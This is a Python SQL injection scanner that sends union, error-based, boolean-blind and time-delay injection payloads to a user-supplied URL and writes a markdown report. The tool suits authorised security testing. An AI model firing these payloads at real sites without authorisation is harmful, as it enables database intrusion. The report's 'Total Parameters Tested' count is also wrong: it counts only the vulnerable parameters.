#!/usr/bin/env python3
"""
SQL Injection Tester
Tests for various SQL injection vulnerabilities including union-based, error-based, and blind SQLi.
"""

import requests
import time
from typing import Dict, List, Optional
from urllib.parse import urljoin, quote

class SQLInjectionTester:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.vulnerable_params = []
    
    def test_union_based(self, param: str, value: str) -> bool:
        """Test for union-based SQL injection"""
        payloads = [
            f"{value}' UNION SELECT NULL--",
            f"{value}' UNION SELECT NULL,NULL--",
            f"{value}' UNION SELECT NULL,NULL,NULL--",
            f"{value}' UNION SELECT 1,2,3--",
            f"{value}' UNION SELECT user(),database(),version()--"
        ]
        
        for payload in payloads:
            try:
                test_url = f"{self.target_url}?{param}={quote(payload)}"
                response = self.session.get(test_url, timeout=5)
                
                # Check for SQL error or union results
                if any(indicator in response.text.lower() for indicator in 
                      ['mysql', 'sql syntax', 'union', 'database', 'version()']):
                    print(f"[+] Potential UNION-based SQLi in parameter: {param}")
                    print(f"    Payload: {payload}")
                    return True
            except:
                pass
        
        return False
    
    def test_error_based(self, param: str, value: str) -> bool:
        """Test for error-based SQL injection"""
        payloads = [
            f"{value}'",
            f"{value}\"",
            f"{value}' OR '1'='1",
            f"{value}' AND 1=1--",
            f"{value}' AND 1=2--",
            f"{value}' UNION SELECT NULL,CONCAT(@@version),NULL--"
        ]
        
        sql_errors = [
            'sql syntax',
            'mysql_fetch',
            'mysql_num_rows',
            'mysql_query',
            'postgresql',
            'ora-',
            'microsoft ole db',
            'sqlite',
            'sql server',
            'odbc',
            'jdbc'
        ]
        
        for payload in payloads:
            try:
                test_url = f"{self.target_url}?{param}={quote(payload)}"
                response = self.session.get(test_url, timeout=5)
                
                for error in sql_errors:
                    if error in response.text.lower():
                        print(f"[+] Potential error-based SQLi in parameter: {param}")
                        print(f"    Payload: {payload}")
                        print(f"    Error detected: {error}")
                        return True
            except:
                pass
        
        return False
    
    def test_blind_boolean(self, param: str, value: str) -> bool:
        """Test for blind boolean-based SQL injection"""
        # True condition
        true_payload = f"{value}' AND 1=1--"
        # False condition
        false_payload = f"{value}' AND 1=2--"
        
        try:
            true_url = f"{self.target_url}?{param}={quote(true_payload)}"
            false_url = f"{self.target_url}?{param}={quote(false_payload)}"
            
            true_response = self.session.get(true_url, timeout=5)
            false_response = self.session.get(false_url, timeout=5)
            
            # Compare responses
            if len(true_response.text) != len(false_response.text):
                print(f"[+] Potential blind boolean-based SQLi in parameter: {param}")
                print(f"    Response length difference detected")
                return True
        except:
            pass
        
        return False
    
    def test_time_based(self, param: str, value: str) -> bool:
        """Test for time-based blind SQL injection"""
        payloads = [
            f"{value}' AND SLEEP(5)--",
            f"{value}' AND WAITFOR DELAY '00:00:05'--",
            f"{value}' AND pg_sleep(5)--"
        ]
        
        for payload in payloads:
            try:
                test_url = f"{self.target_url}?{param}={quote(payload)}"
                start_time = time.time()
                response = self.session.get(test_url, timeout=10)
                elapsed_time = time.time() - start_time
                
                if elapsed_time >= 4:  # Allow some margin
                    print(f"[+] Potential time-based blind SQLi in parameter: {param}")
                    print(f"    Payload: {payload}")
                    print(f"    Response time: {elapsed_time:.2f} seconds")
                    return True
            except:
                pass
        
        return False
    
    def test_parameter(self, param: str, value: str = "1") -> Dict:
        """Test a parameter for SQL injection"""
        results = {
            'parameter': param,
            'union_based': False,
            'error_based': False,
            'blind_boolean': False,
            'time_based': False,
            'vulnerable': False
        }
        
        print(f"\n[*] Testing parameter: {param}")
        
        results['union_based'] = self.test_union_based(param, value)
        results['error_based'] = self.test_error_based(param, value)
        results['blind_boolean'] = self.test_blind_boolean(param, value)
        results['time_based'] = self.test_time_based(param, value)
        
        results['vulnerable'] = any([
            results['union_based'],
            results['error_based'],
            results['blind_boolean'],
            results['time_based']
        ])
        
        if results['vulnerable']:
            self.vulnerable_params.append(results)
        
        return results
    
    def test_all(self, params: List[str]) -> List[Dict]:
        """Test multiple parameters"""
        results = []
        for param in params:
            result = self.test_parameter(param)
            results.append(result)
        
        return results
    
    def generate_report(self) -> str:
        """Generate vulnerability report"""
        report = f"# SQL Injection Test Report\n\n"
        report += f"**Target**: {self.target_url}\n\n"
        report += f"## Summary\n\n"
        report += f"Total Parameters Tested: {len(self.vulnerable_params)}\n"
        report += f"Vulnerable Parameters: {len([p for p in self.vulnerable_params if p['vulnerable']])}\n\n"
        
        report += "## Vulnerable Parameters\n\n"
        for vuln in self.vulnerable_params:
            if vuln['vulnerable']:
                report += f"### {vuln['parameter']}\n\n"
                report += f"- Union-based: {'Yes' if vuln['union_based'] else 'No'}\n"
                report += f"- Error-based: {'Yes' if vuln['error_based'] else 'No'}\n"
                report += f"- Blind Boolean: {'Yes' if vuln['blind_boolean'] else 'No'}\n"
                report += f"- Time-based: {'Yes' if vuln['time_based'] else 'No'}\n\n"
        
        return report

def main():
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python sql_injection_tester.py <target_url> [param1] [param2] ...")
        print("Example: python sql_injection_tester.py http://example.com/page.php id user")
        sys.exit(1)
    
    target_url = sys.argv[1]
    params = sys.argv[2:] if len(sys.argv) > 2 else ['id', 'user', 'page']
    
    tester = SQLInjectionTester(target_url)
    
    print(f"[*] Testing SQL injection on: {target_url}")
    print(f"[*] Parameters to test: {', '.join(params)}\n")
    
    results = tester.test_all(params)
    
    # Generate report
    report = tester.generate_report()
    with open('sql_injection_report.md', 'w') as f:
        f.write(report)
    
    print(f"\n[+] Report saved to sql_injection_report.md")
    print(f"[!] WARNING: Only test on systems you own or have permission to test!")

if __name__ == '__main__':
    main()

